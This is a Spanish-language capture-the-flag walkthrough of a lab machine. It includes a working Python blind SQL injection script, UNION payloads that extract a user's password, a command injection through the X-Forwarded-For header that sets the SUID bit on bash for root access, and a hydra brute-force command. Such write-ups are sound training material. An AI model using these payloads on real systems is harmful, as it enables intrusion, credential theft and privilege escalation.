Realizamos un escaneo con nmap
![[Pasted image 20240621094901.png]]

Accedemos a la web y encontramos un panel de login
![[Pasted image 20240621094945.png|500]]

Ahora creamos un usuario
![[Pasted image 20240621104130.png|300]]
![[Pasted image 20240621103955.png|300]]

Y como vemos nos hemos logueado
![[Pasted image 20240621104220.png]]

Ahora probaremos ha hacer un sql injection
![[Pasted image 20240621104342.png]]

Y como vemos hemos podido acceder con un usuario aleatorio
![[Pasted image 20240621104407.png]]

Ahora intentaremos obtener el nombre de la base de datos, para ello ejecutaremos el siguiente script de python
```Python
import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://10.10.237.218/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack compleated B)")
                print(f"DB_NAME: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()

```

Y como vemos al ejecutarlo obtenemos el nombre de la base de datos
![[Pasted image 20240621114045.png]]

Ahora sacaremos el nombre de la tabla, para ello modificaremos esta parte del script
```
UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY
```
![[Pasted image 20240621121119.png]]

Y ahora volveremos a modificar el parametro para sacar la password de kitty
```
UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY
```
![[Pasted image 20240621121355.png]]

Ahora accederemos por ssh a la maquina
![[Pasted image 20240621121500.png]]
![[Pasted image 20240621121515.png]]

![[Pasted image 20240621121810.png]]

Revisando información encontramos las credenciales para acceder a la base de datos con el usuario kitty
![[Pasted image 20240621130058.png]]


En las tareas encontramos una que se ejecuta cada minuto
![[Pasted image 20240621135325.png]]

Revisamos que hay en la carpeta y leemos el script
![[Pasted image 20240621135217.png]]

Continuando revisando encontramos que en el puerto 8080 esta corriendo un servicio
![[Pasted image 20240621135518.png]]

Así que haremos portforwarding para poder conectarnos desde nuestra maquina, para ello abriremos un servidor en nuestra maquina con chisel
![[Pasted image 20240621133321.png]]

Y ahora en la maquina victima ejecutamos lo siguiente
![[Pasted image 20240621133349.png]]

Ahora ya podemos ir al navegador y ver que esta corriendo en ese servidor
![[Pasted image 20240621133421.png|500]]

Ahora capturamos la peticion y añadimos la siguiente linea
```
X-FORWARDED-FOR:;touch /tmp/Poc
```
![[Pasted image 20240621133632.png]]

Si ahora volvemos a la carpeta veremos el fichero Poc con permisos de root
![[Pasted image 20240621134823.png]]

Así que ahora añadiremos la siguiente linea
```
chmod +s /usr/bin/bash
```
![[Pasted image 20240621134906.png]]

Y como vemos en la ultima captura hemos obtenido una sesion como root
![[Pasted image 20240621135019.png]]


--------
Por fuerza bruta podemos obtener la password de admin
```
hydra -l admin -P /home/wolf/rockyou.txt 10.10.237.218 http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid username or password'
```
![[Pasted image 20240621121837.png]]